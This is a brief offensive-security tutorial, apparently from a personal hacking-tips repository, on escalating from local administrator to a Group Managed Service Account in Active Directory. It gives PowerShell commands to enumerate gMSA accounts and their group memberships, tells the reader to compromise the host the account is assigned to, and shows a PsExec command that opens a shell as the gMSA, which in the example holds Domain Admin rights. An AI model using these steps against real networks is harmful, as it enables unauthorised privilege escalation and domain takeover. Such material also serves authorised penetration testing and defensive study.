# Elevate from Local admin to gMSA account
Some of the steps in this tutorial used [ADModule](https://github.com/pwnj0hn/HackingTipsNTricks/blob/main/Active%20Directory%20Recon/ADModule.md)
* Check if any gMSA accounts are present in the domain.
 ```powershell
Get-ADServiceAccount -Filter * -properties dnshostname
```
![](https://raw.githubusercontent.com/pwnj0hn/HackingTipsNTricks/main/img/gmsa_01.png)

* Check if gMSA user have any interesting permissions so it is worth hijacking
 ```powershell
Get-ADPrincipalGroupMembership -Identity "http_svc$"
 ```
 https://raw.githubusercontent.com/pwnj0hn/HackingTipsNTricks/main/img/gmsa_02.png
 
* Compromise the server which gMSA is assigned too.
* Download [SysInternals PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec)
* Open Administrator PowerShell or cmd prompt
* 
![](https://raw.githubusercontent.com/pwnj0hn/HackingTipsNTricks/main/img/gmsa_03.png)

* Use PsExec to spawn a cmd or PowerShell prompt as the gMSA account. Password can be anything. If not giving password as argument, just hit enter at the password prompt.

```powershell
.\PsExec.exe -i -u velvet\http_svc$ -p foobar cmd.exe
```
![](https://raw.githubusercontent.com/pwnj0hn/HackingTipsNTricks/main/img/gmsa_04.png)



In this case the http_svc$ account have Domain Admin rights, which it really should not have but we see service accounts have way to many priviliges all the time. DA is used in this example as a worst case scenario. It might have other cool priviliges too in other scenarios.

![](https://raw.githubusercontent.com/pwnj0hn/HackingTipsNTricks/main/img/gmsa_05.png)
